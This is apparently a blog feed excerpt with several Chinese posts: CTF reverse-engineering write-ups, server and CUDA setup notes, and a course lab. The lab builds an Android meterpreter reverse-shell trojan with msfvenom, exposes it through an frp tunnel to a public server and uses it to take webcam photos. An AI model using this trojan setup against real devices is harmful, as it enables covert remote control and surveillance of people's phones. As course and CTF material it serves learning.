alt="8.png"></p><p>选中变量右键分析，可以查看在那些地方被调用。<br>我的机器上这个功能有点儿问题，不能找到被赋值处，可以遍历程序结构检查。<br>找到redlist,bluelist,score,hp的赋值和使用代码。</p><p>例如：<br>红球的X和Y坐标被取两位小数并转string相连后加入redlist(string数组)中。<br>在检验状态时，取出来进行抑或，加入状态字符串。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171611755.png" alt="9.png"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171611504.png" alt="10.png"></p><h3 id="打印数据"><a href="#打印数据" class="headerlink" title="打印数据"></a>打印数据</h3><p>由于游戏中景物的坐标不变，只是吃到球的顺序改变，对应到状态字符串中是字符串顺序改变而内容不变。<br>所以我在C0t1Nu30RnOt()中添加了一些代码，打印出每个球坐标的异或值以及月亮、云坐标的异或值。<br>剩下的交由枚举顺序爆破吧。<br>选中类-右键-编辑类-编辑代码-编译-选中左上文件栏-保存模块或保存全部，这样才算完成了dll覆写。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171611859.png" alt="11.png"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171611102.png" alt="13.png"></p><h3 id="枚举状态"><a href="#枚举状态" class="headerlink" title="枚举状态"></a>枚举状态</h3><p>不必把球吃完，也没有提示不吃蓝球，所以枚举数量很大。<br>满打满算是10选10的全排列+10选9的全排列+…+10选0的全排列。<br>由当前枚举到的状态可以计算score值，但还需枚举hp值。<br>从游戏玩家的角度出发，自然希望吃完红球，不吃蓝球，不碰怪，hp和score都是max。<br>可以由此指定搜索策略。<br>然而我失败了，不管是优先搜索还是全面暴力都没有结果。<br>至此，不由得对比赛时段内就做出来的dalao们献上膝盖。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171611943.png" alt="12.png"></p><h3 id="坐等官方WP来看看哪儿出了问题。"><a href="#坐等官方WP来看看哪儿出了问题。" class="headerlink" title="坐等官方WP来看看哪儿出了问题。"></a>坐等官方WP来看看哪儿出了问题。</h3><p>哦，原来是隐藏了一个球，告辞…</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;很久之前，巅峰极客的两个Unity游戏逆向题。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://slient2009.github.io/tags/CTF/"/>
    
    <category term="RE" scheme="http://slient2009.github.io/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>MSF-Android课程实验</title>
    <link href="http://slient2009.github.io/2022/12/18/MSF-Android/"/>
    <id>http://slient2009.github.io/2022/12/18/MSF-Android/</id>
    <published>2022-12-18T05:00:03.000Z</published>
    <updated>2022-12-17T07:59:56.000Z</updated>
    
    <content type="html"><![CDATA[<p>MSF-Android课程实验，使用frp做内网穿透来控制木马。</p><span id="more"></span><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171556008.png" alt="1"></p><h2 id="总述"><a href="#总述" class="headerlink" title="总述"></a>总述</h2><p>在实践课上有布置frp内网穿透（内网到公网）和简单的msf木马使用（木马只能内网通信）的任务。此处将两者结合，把木马链接到服务器上，经过内网穿透在本地控制木马。都是入门级实践。</p><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>frp代码下载：<a href="https://github.com/fatedier/frp/releases?tdsourcetag=s_pctim_aiomsg">https://github.com/fatedier/frp/releases?tdsourcetag=s_pctim_aiomsg</a><br>内网 kali虚拟机<br>公网 Ubuntu服务器<br>android手机一台</p><h3 id="部署frps"><a href="#部署frps" class="headerlink" title="部署frps"></a>部署frps</h3><p>到上述链接下载对应代码到服务器和本地。<br>或者使用命令<code>wget https://github.com/fatedier/frp/releases/download/v0.21.0/frp_0.21.0_linux_amd64.tar.gz</code></p><p>解压</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf frp_0.21.0_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure><p>进入目录frp_0.21.0_linux_amd64编辑frps.ini</p><ol><li>vim frps.ini进入编辑，insert键开始编辑，esc键停止编辑，shift+Z+Z保存并退出。</li><li>bind_port是自己设定的frp服务端端口</li><li>vhost_http_port是自己设定的http访问端口。</li><li>执行./frps启动frp服务器端的服务</li></ol><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171556831.png" alt="2"></p><h3 id="配置frpc"><a href="#配置frpc" class="headerlink" title="配置frpc"></a>配置frpc</h3><p>客户端的操作与服务器端类似，具体参数不同而已。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 编辑frpc.ini :</span></span><br><span class="line">server_addr = x.x.x.x   #设置公网服务器的ip地址</span><br><span class="line">server_port = 7000</span><br><span class="line">local_ip = 127.0.0.1    #设置本地的ip</span><br><span class="line">local_port = 4444       #内网提供的端口,为后续使用msf，此处监听4444端口</span><br><span class="line">remote_port = 6000   #公网映射的端口</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171557160.png" alt="3"></p><p>执行./frpc启动frpc服务<br>两端服务连接成功的提示</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171557107.png" alt="4"></p><h3 id="利用msf生成一个简单木马"><a href="#利用msf生成一个简单木马" class="headerlink" title="利用msf生成一个简单木马"></a>利用msf生成一个简单木马</h3><pre><code>msfvenom -p android/meterpreter/reverse_tcp lhost=serverIP lport=4444 R &gt; horse.apk</code></pre><p>lhost指向公网服务器ip<br>lport与fpc.ini的remote_port相同</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171557065.png" alt="5"></p><p>确保frp连接畅通，木马安装并开始运行，输入exploit并回车<br>webcam_snap拍摄照片（默认后置摄像头）</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171557534.png" alt="6"></p><h3 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h3><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171557869.png" alt="7"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;MSF-Android课程实验，使用frp做内网穿透来控制木马。&lt;/p&gt;</summary>
    
    
    
    
    <category term="Android" scheme="http://slient2009.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>搬家记录</title>
    <link href="http://slient2009.github.io/2022/12/18/Leave/"/>
    <id>http://slient2009.github.io/2022/12/18/Leave/</id>
    <published>2022-12-18T05:00:02.000Z</published>
    <updated>2022-12-17T07:42:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>整理之前的笔记</p><span id="more"></span><p>笔者终于决定把网站搬到外面来，在这个过程中顺手学习到了以下的新东西。</p><h2 id="中国大陆骨干网小记"><a href="#中国大陆骨干网小记" class="headerlink" title="中国大陆骨干网小记"></a>中国大陆骨干网小记</h2><blockquote><p>为了选择合适VPS服务商，但是最后还是因为资金的原因租了原来的商家。</p></blockquote><p>摘自 <a href="https://zhuanlan.zhihu.com/p/64467370">https://zhuanlan.zhihu.com/p/64467370</a><br>参考 <a href="https://www.oldking.net/751.html">https://www.oldking.net/751.html</a></p><h3 id="中国电信"><a href="#中国电信" class="headerlink" title="中国电信"></a>中国电信</h3><p>ChinaNet 163骨干网 提供普通质量的服务，国内访问还算OK（但是晚上的体验令人动容），一要出国就不行了，因为承载了大部分电信用户的流量。</p><p>ChinaNet Next Carrying Network(CN2)能够同时承载语音、数据、视频、全球互联等业务，尤其是全球互联方面，相对于 163 网而言，CN2 低丢包、低延时、轻负载。</p><p>回国或出国，必定经过北京/上海/广州。（乌鲁木齐走中亚，此处忽略）</p><p>进出口路由路径，分为三个级别：</p><ol><li><p>163 网（CN1）[AS4134 202.97.*.*]来回都通过CN1到北上广出国</p></li><li><p>CN2 GT（Global Transfer 又称半程 CN2 ）例如去时直接上CN2出国，但是回来的流量进入国内就走CN1，比较好的解决方案是去时走CN1回来走CN2，毕竟总是回来的流量大一些。</p></li><li><p>CN2 GIA（Global Internet Access 又称纯 CN2/全程 CN2）全程CN2，直接就近进入CN2网络，有的地区没有CN2接入点只能找相邻的地区。体验很好也很贵。</p><p>[CN2 AS4809 59.43.*.*]</p></li></ol><h3 id="中国联通"><a href="#中国联通" class="headerlink" title="中国联通"></a>中国联通</h3><p>[169网络 AS4837 219.158.*.*]</p><p>[A网 AS9929 218.105.*.*/210.*.*.*]</p><p>169 网络和 A 网之间的区别，与 163 网络和 CN2 之间的区别并不是一个概念，<strong>A 网</strong>早在中国网通时代就已存在，<strong>属于中国网通的骨干网</strong>。在网通和联通合并后，联通仍继续建设当年从电信 163 网分出来的那一部分，即现如今的 169 网(分出来的原因是应当年政企分离的要求，不是电信自己分的)，而这张 A 网就闲置了。虽然该产品的定位，名义上和中国电信的 CN2 网络对标，但这张“吃老本”的 <strong>A 网所具备的优势仅仅是用户少，网络负荷小</strong>，所以表现也还不错，一般给政企、高端用户使用。但由于这张网络多年没有再发展，所以跟持续扩容的 CN2 比，质量方面的差距只会越来越大。</p><h3 id="中国移动"><a href="#中国移动" class="headerlink" title="中国移动"></a>中国移动</h3><p>[AS9808 ]承载移动的大部分流量，其中又以广州承载移动的大部分出海流量，从这里访问东南亚的体验仅次于CN2 GIA。</p><p>[旧铁通 AS9314几乎被废弃]</p><p><img src="https://i.loli.net/2020/08/30/9wpkUIZ5fRHhqBd.png" alt="image-20200709231854563"></p><p><img src="https://i.loli.net/2020/08/30/drlMVAT2SwcaoyF.png" alt="image-20200709231911112"></p><p><img src="https://i.loli.net/2020/08/30/hadTzuGIEmyrtSM.png" alt="image-20200709231959048"></p><p><img src="https://i.loli.net/2020/08/30/8KgGRpEMfQ6m91j.png" alt="image-20200709232011617"></p><h2 id="安装V2Ray"><a href="#安装V2Ray" class="headerlink" title="安装V2Ray"></a>安装V2Ray</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;(curl -L -s https://install.direct/go.sh)</span><br></pre></td></tr></table></figure><h3 id="记录信息"><a href="#记录信息" class="headerlink" title="记录信息"></a>记录信息</h3><p>PORT:11451<br>UUID:b7328fb8-da6d-497e-b2b7-a9114514123e</p><h3 id="启动并检查状态"><a href="#启动并检查状态" class="headerlink" title="启动并检查状态"></a>启动并检查状态</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start v2ray[systemctl v2ray start]</span><br><span class="line">systemctl status v2ray[systemctl v2ray status]</span><br></pre></td></tr></table></figure><h3 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h3><p>当然可以直接drop firewall，这里稳健一点儿，把刚刚使用的端口开放就好</p><h3 id="添加配置"><a href="#添加配置" class="headerlink" title="添加配置"></a>添加配置</h3><p><img src="https://i.loli.net/2020/08/30/8jokdYquvH9NZ43.png" alt="image-20200710173624031"></p><h3 id="google-BBR加速"><a href="#google-BBR加速" class="headerlink" title="google-BBR加速"></a>google-BBR加速</h3><p>事实上，版本稍微高一点儿的内核就已经包括了BBR，只需要打开就好。</p><h4 id="开启方法"><a href="#开启方法" class="headerlink" title="开启方法"></a>开启方法</h4><p><a href="https://blog.sprov.xyz/2019/02/04/bbr-tcp-faster/">https://blog.sprov.xyz/2019/02/04/bbr-tcp-faster/</a><br><a href="https://www.cnblogs.com/sunylat/p/9521881.html">https://www.cnblogs.com/sunylat/p/9521881.html</a></p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><a href="http://www.taohui.pub/2019/08/07/%E4%B8%80%E6%96%87%E8%A7%A3%E9%87%8A%E6%B8%85%E6%A5%9Agoogle-bbr%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86/">http://www.taohui.pub/2019/08/07/%E4%B8%80%E6%96%87%E8%A7%A3%E9%87%8A%E6%B8%85%E6%A5%9Agoogle-bbr%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86/</a></p><h4 id="利用国内VPS中转加速"><a href="#利用国内VPS中转加速" class="headerlink" title="利用国内VPS中转加速"></a>利用国内VPS中转加速</h4><p><a href="https://hijk.pp.ua/forward-traffic-via-internal-vps/">https://hijk.pp.ua/forward-traffic-via-internal-vps/</a></p><h2 id="Typecho搬家"><a href="#Typecho搬家" class="headerlink" title="Typecho搬家"></a>Typecho搬家</h2><blockquote><p>显然现在转投Github了</p></blockquote><ol><li><p>我先在新的机器上安装了宝塔，只是个人博客的话，就选极速安装推荐配置吧，否则要等编译两三个小时。</p><p>​    宝塔安装 <a href="https://www.bt.cn/download/linux.html">https://www.bt.cn/download/linux.html</a></p><p>​    宝塔添加站点 <a href="https://boke112.com/6675.html">https://boke112.com/6675.html</a></p><p>​    整个域名 <a href="https://zhuanlan.zhihu.com/p/33921436">https://zhuanlan.zhihu.com/p/33921436</a></p><p>​    安装Typecho <a href="https://zhuanlan.zhihu.com/p/34211709">https://zhuanlan.zhihu.com/p/34211709</a></p></li><li><p>在新的机器上先搭建好一个新的Typecho博客，数据库名称和原博客相同。(也可以不必先纠结于此，可以后面在配置文件中修改)</p></li><li><p>备份原来博客的usr目录。  <code>tar zcvf usr.tar.gz usr</code>  (注意是站点的usr而不是系统的usr)</p></li><li><p>将备份的博客usr目录，上传到新机器覆盖原来的usr目录。(同样注意是站点的usr目录，不是系统的)。</p></li><li><p>备份mysql数据库。 <code>mysqldump -uroot -p --all-databases &gt; sqlfile.sql</code></p></li><li><p>将备份的数据库文件上传到新机器，并将备份的数据库导入到新机器的mysql中。<code>mysql -uroot -p &lt;sqlfile.sql</code> </p></li><li><p>如果有Database Error，可以检查配置文件是不是和原来站点的配置一样。特别注意一下数据库前缀，因为当初设置的可能已经忘了。<br>配置文件路径 /www/wwwroot/myblogsite/conf.inc.php</p></li></ol><p><img src="https://i.loli.net/2020/08/30/81B7l3ZyqWoDREM.png" alt="image-20200711215249553"></p><h3 id="配置SSL证书"><a href="#配置SSL证书" class="headerlink" title="配置SSL证书"></a>配置SSL证书</h3><p>宝塔是世界上最好的控制面板！没有之一，SSL直接上，不用自己手动去搞letsencrypt certonly….</p><p>   <img src="https://i.loli.net/2020/08/30/vBTUetWRKCIH6ao.png" alt="image-20200830110325826"></p><h3 id="不安全的小锁"><a href="#不安全的小锁" class="headerlink" title="不安全的小锁"></a>不安全的小锁</h3><p><img src="https://i.loli.net/2020/08/30/j3GQmtfA7l6wsOq.png" alt="image-20200830110357569"></p><p>因为数据是直接搬过来的，所以页面里面引用的图片等资源还是指向的原来的站点，而原来的站点是没有SSL的，那么虽然现在的站点配置了SSL但是部分内容引用的是未SSL网站的内容，是为混合内容，小锁失效。</p><p><img src="https://i.loli.net/2020/08/30/wMbGA2SK9Qsez1H.png" alt="image-20200713140431556"></p><p>解决的方法就是改成现在站点的。<br>内容不多倒是可以手动改(还好现在就是这样)<br>要是文章多的话就只好写写脚本吧</p><h3 id="Post-to-google"><a href="#Post-to-google" class="headerlink" title="Post to google"></a>Post to google</h3><p>把网站提交给Google满足以下访问量的虚荣心，但是没想到它事儿还挺多。</p><p><a href="https://search.google.com/search-console/welcome?utm_source=wmx&amp;utm_medium=deprecation-pane&amp;utm_content=home">https://search.google.com/search-console/welcome?utm_source=wmx&amp;utm_medium=deprecation-pane&amp;utm_content=home</a></p><p>TXT解析慢得要死，明天再来。<br>或者选择html文件验证。</p><h2 id="VScode-remote-远程开发免密钥"><a href="#VScode-remote-远程开发免密钥" class="headerlink" title="VScode remote 远程开发免密钥"></a>VScode remote 远程开发免密钥</h2><blockquote><p>这个是真的方便，后面ssh和VScode都不用输密码，注意保护好密钥文件。</p></blockquote><p><a href="https://blog.csdn.net/qq_41554005/article/details/103103443">https://blog.csdn.net/qq_41554005/article/details/103103443</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd&gt; ssh-keygen -t rsa -b <span class="number">4096</span> </span><br><span class="line"><span class="comment"># 生成id_rsa.pub公钥文件和id_rsa私钥文件。（文件会生成在cmd当前目录下）</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/08/30/48PW25o9AhTVaMK.png" alt="image-20200714204419522"></p><p>把公钥pub上传到服务器，保存为/home/user/.ssh/authorized_key。<br>修改authorized_key权限为600，修改.ssh目录权限为700。</p><p>本地VScode配置文件中编辑</p><p><img src="https://i.loli.net/2020/08/30/ihf7PHbTepVO1aE.png" alt="image-20200714204233712"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;整理之前的笔记&lt;/p&gt;</summary>
    
    
    
    
    <category term="配置" scheme="http://slient2009.github.io/tags/%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>今晚，我安装好了CUDA+PyCUDA+Anaconda</title>
    <link href="http://slient2009.github.io/2022/12/18/InstallCUDA/"/>
    <id>http://slient2009.github.io/2022/12/18/InstallCUDA/</id>
    <published>2022-12-18T05:00:01.000Z</published>
    <updated>2022-12-17T07:36:12.000Z</updated>
    
    <content type="html"><![CDATA[<p>整理之前的笔记</p><span id="more"></span><p><img src="https://i.loli.net/2020/11/20/IBMFVHb81kUNY9j.jpg" alt="11"></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>未来一段时间要用python在GPU上写一些代码，需要安装python+CUDA。<br>但是却在环境问题上耽误了大概两周的样子，修了又修，接近自闭。<br>今晚终于在Jing老师和LCX的帮助下解决了。<br>怎么想都想不到竟然是分号的问题？！<br>本文安装步骤来自LCX的安装文档，再加上Jing老师的指导，笔者主要是在记录详细过程。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="Anaconda-python"><a href="#Anaconda-python" class="headerlink" title="Anaconda-python"></a>Anaconda-python</h3><p>预先安装的python就不要了，用anaconda提供的python。<br>anaconda会提供一些常用的工具包，在它下面运行python会比较方便(LCX语)。<br>从官网下载安装包默认安装即可，建议在安装时将它添加到环境变量中方便使用。</p><p><img src="https://i.loli.net/2020/11/20/PtvUm5qdyRW4gO3.png" alt="22"></p><p>然后在anaconda prompt中安装pycuda<br>conda install pycuda 或者 pip install pycuda</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171526277.png"></p><h3 id="Visual-Studio"><a href="#Visual-Studio" class="headerlink" title="Visual Studio"></a>Visual Studio</h3><p>不必用VS编写代码，这里用的是它的VC++的一些发行版本。<br>笔者在头铁尝试VS2017碰壁后灰溜溜回到VS2015。<br>虽然没有直接证据证明VS2017不行，但综合网上文章和朋友的经验，还是VS2015稳一点。<br>当然，有可能会用到VC2015的一个修复版本来解决文件缺失的问题。<br><a href="https://www.microsoft.com/en-us/download/details.aspx?id=48145">https://www.microsoft.com/en-us/download/details.aspx?id=48145</a></p><h3 id="CUDA-Toolkit和CUDNN"><a href="#CUDA-Toolkit和CUDNN" class="headerlink" title="CUDA Toolkit和CUDNN"></a>CUDA Toolkit和CUDNN</h3><p>CUDNN  <a href="https://developer.nvidia.com/cudnn">https://developer.nvidia.com/cudnn</a><br>先下载好，后面会用到<br>CUDA Toolkit <a href="https://developer.nvidia.com/cuda-downloads">https://developer.nvidia.com/cuda-downloads</a><br>注意下载的版本，笔者使用的是v10.2<br>组件按需要选择，我用这四个就可以了。</p><p><img src="https://i.loli.net/2020/11/20/Fd1XP7TGVSUz3uC.png"></p><p>CUDA会自动配置一些环境变量，还有一些需要手动配置。<br>环境变量中添加：</p><pre><code>CUDA_LIB_PATH = %CUDA_PATH%\lib\x64 CUDA_BIN_PATH = %CUDA_PATH%\bin CUDA_SDK_BIN_PATH = %CUDA_SDK_PATH%\bin\win64 CUDA_SDK_LIB_PATH = %CUDA_SDK_PATH%\common\lib\x64 </code></pre><p>Path中添加：</p><pre><code>C:\Program Files\NVIDIA Corporation\NVSMIC:\Program Files\NVIDIA Corporation\NVIDIA NvDLISRC:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\libC:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\includeC:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\binC:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\libnvvp</code></pre><p>当然，需要添加的路径取决于安装的组件和安装目录，别直接复制。</p><p>将CUDNN下的bin include lib三个文件夹添加到<br>C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2下面的bin include lib中，<br>实际上只是将CUDNN的三个文件添加到目录下。</p><p><img src="https://i.loli.net/2020/11/20/G53LzqejyfpIlH7.png"></p><h2 id="验证与报错解决"><a href="#验证与报错解决" class="headerlink" title="验证与报错解决"></a>验证与报错解决</h2><p>是的，本文的主要内容是解决一些神奇的报错和环境问题。<br>毕竟笔者两周的自闭时光不能毫无产出啊。</p><h3 id="nvcc-V"><a href="#nvcc-V" class="headerlink" title="nvcc -V"></a>nvcc -V</h3><p>这只是最基本的检查，有结果也不能说明安装成功，出错可能还更麻烦。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171530478.png"></p><h3 id="bandwidthTest-exe和deviceQuery-exe"><a href="#bandwidthTest-exe和deviceQuery-exe" class="headerlink" title="bandwidthTest.exe和deviceQuery.exe"></a>bandwidthTest.exe和deviceQuery.exe</h3><p>以上两个程序在目录C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\extras\demo_suite中。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171531934.png"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171531935.png"></p><p>如果遇到报错，有return Error <strong>35</strong>，driver <strong>insuffcient</strong>之类字样的报错信息，那可能是驱动版本太低了，需要更新显卡驱动到最新。</p><h3 id="Anaconda"><a href="#Anaconda" class="headerlink" title="Anaconda"></a>Anaconda</h3><p>也许你又和我一样，在用anaconda安装pycuda时就看到这样的提示。<br>虽然conda install pycuda没有成功，但是pip install pycuda解决，仿佛问题不大。<br>然而，这个却是笔者环境问题的关键。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171531292.png"></p><p>[superuser.com][10]上的回答没有参考价值，并不是双引号的原因。<br>笔者<strong>猜测</strong>可能是anaconda在解析Path环境变量时会每读一行就添加一个分号来分隔一行环境变量值。<br>要是你像我一样行末本来就有分号就麻烦了，需要删除每一行行末的分号。<br>笔者甚至把Path中的每一个路径单独作一行才解决这个问题。<br>如果解决，进入anaconda prompt时没有错误提示。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171532764.png"></p><h3 id="cl-exe"><a href="#cl-exe" class="headerlink" title="cl.exe"></a>cl.exe</h3><p>这时候可以尝试跑一条测试代码看看有没有成功使用到GPU。<br>遗憾的是<strong>又一次</strong>报错了，关于cl.exe，泪儿流下来。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171532297.png"></p><p>这时候去 C:\Program Files (x86)\Microsoft Visual Studio v14.0\VC\bin\amd64，这里有一个cl.exe，把路径添加到Path中。<br>(注意要选amd64，它隔壁目录也有cl.exe，不要认为都可以)<br>在把 C:\Program Files (x86)\Microsoft Visual Studio v14.0\VC\bin也加进Path去。</p><h3 id="corecrt-h和stddef-h缺失"><a href="#corecrt-h和stddef-h缺失" class="headerlink" title="corecrt.h和stddef.h缺失"></a>corecrt.h和stddef.h缺失</h3><p>再一次运行，又报错了，运行时提示No such file or directy。<br>添加C:\Program Files (x86)\Windows Kits\10\Include\10.0.10240.0\ucrt到Path中，可以先检查一下这个目录下有没有这两个文件。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>再一次感谢Jing老师的指导和LCX提供的安装文档，并且在这两周一直帮我想办法。</p><p>同时，本文的目录仅供参考，读者还是要以自己的安装目录为准。</p><p>如果玄学问题不断，而且又把安装目录指定为机械盘，可能是硬盘的错误需要重装。（虽然可能性极小）</p><p>环境的玄学问题还是要及时请教有经验的人士，避免自己无脑重装软件却丝毫没有触及核心问题。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;整理之前的笔记&lt;/p&gt;</summary>
    
    
    
    
    <category term="配置" scheme="http://slient2009.github.io/tags/%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>ISCC CTF Android</title>
    <link href="http://slient2009.github.io/2022/05/04/ISCC-Android/"/>
    <id>http://slient2009.github.io/2022/05/04/ISCC-Android/</id>
    <published>2022-05-04T04:00:01.000Z</published>
    <updated>2022-06-14T03:45:44.000Z</updated>
    
    <content type="html"><![CDATA[<p>北京理工大学信息系统及安全对抗实验中心 2022年第19届信息安全与对抗技术竞赛 部分逆向题</p><span id="more"></span><h1 id="Amy’s-Code"><a href="#Amy’s-Code" class="headerlink" title="Amy’s Code"></a>Amy’s Code</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">aim = [<span class="number">149</span>,<span class="number">169</span>,<span class="number">137</span>,<span class="number">134</span>,<span class="number">212</span>,<span class="number">188</span>,<span class="number">177</span>,<span class="number">184</span>,<span class="number">177</span>,<span class="number">197</span>, <span class="number">192</span>, <span class="number">179</span>, <span class="number">153</span>, <span class="number">124</span>, <span class="number">185</span>, <span class="number">129</span>, <span class="number">159</span>, <span class="number">196</span>, <span class="number">142</span>, <span class="number">184</span>]</span><br><span class="line">adv = <span class="built_in">list</span>(<span class="string">&quot;LWHFUENGDJGEFHYDHIGJ&quot;</span>)</span><br><span class="line">flag = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    flag[ind] = aim[ind] - <span class="built_in">ord</span>(adv[ind])</span><br><span class="line">    flag[ind] = flag[ind] ^ ind</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">chr</span>(x), flag)))</span><br></pre></td></tr></table></figure><h1 id="How-decode"><a href="#How-decode" class="headerlink" title="How_decode"></a>How_decode</h1><p>xxtea加密，可以用这个<a href="https://github.com/polymorf/findcrypt-yara">findcrypt</a>工具来分辨常见的加密算法。</p><p>本来是比较简单的，可是我自己想尝试使用python实现一遍xxtea算法，因为不太熟悉算法废了些时间，主要是处理一些运算细节。</p><p>其实也有现成的C的<a href="https://qianfei11.github.io/2019/08/22/Python%E5%AE%9E%E7%8E%B0TEA%E3%80%81XTEA%E3%80%81XXTEA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/">轮子</a>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">int32</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x &amp; ( (<span class="number">1</span>&lt;&lt;<span class="number">32</span>)-<span class="number">1</span> ) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">u2i</span>(<span class="params">x</span>):</span></span><br><span class="line">    x = int32(x)</span><br><span class="line">    maxint = (<span class="number">1</span>&lt;&lt;<span class="number">31</span>) -<span class="number">1</span>  </span><br><span class="line">    <span class="keyword">if</span> x &gt; maxint:</span><br><span class="line">        x = -maxint - <span class="number">2</span> + (x - maxint)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span 